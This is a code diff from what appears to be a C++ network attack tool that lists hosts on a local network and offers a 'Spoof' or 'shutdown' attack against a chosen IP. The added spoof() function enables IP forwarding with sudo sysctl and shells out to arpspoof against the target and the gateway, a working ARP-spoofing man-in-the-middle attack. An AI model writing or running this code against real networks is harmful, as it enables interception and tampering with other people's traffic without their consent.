@@ -100,11 +100,11 @@ void Net::displayIpv4s()
 
 		for(const Ipv4 &ip : _ips)
 			if (increment++ == chosenIpv4)
-				attackMenu(routers, ip);
+				attackMenu(ip);
 	}
 }
 
-void Net::attackMenu(list<Ipv4> routers, const Ipv4 &ip)
+void Net::attackMenu(const Ipv4 &ip)
 {
 	Menu optionsMenu;
 
@@ -118,8 +118,7 @@ void Net::attackMenu(list<Ipv4> routers, const Ipv4 &ip)
 		{
 		case 0:
 			//Spoof
-			for(const Ipv4 &router: routers)
-				spoof(router, ip);
+			spoof(ip);
 			break;
 
 		case 1:
@@ -130,10 +129,22 @@ void Net::attackMenu(list<Ipv4> routers, const Ipv4 &ip)
 	}
 }
 
-void Net::spoof(const Ipv4& router, const Ipv4& target) const
+void Net::spoof(const Ipv4& target) const
 {
 	//Linux command [arpspoof]
+	#ifdef __linux__
+	string
+		ipforwardCommand = "sudo sysctl -w net.ipv4.ip_forward=1",
+		spoofCommand = "arpspoof -i " + _name + " -t " + target.toString(false) + " " + _gateIp.toString(false);
 
+	cout
+		<< "Commanding: " << spoofCommand << endl
+		<< "Leave with CTRL+C if you want to" << "Press any key to continue" << endl << endl;
+	_getch();
+	
+	system(ipforwardCommand.c_str());
+	system(spoofCommand.c_str());
+	#endif
 }
 
 void Net::shutdown(const Ipv4& target) const
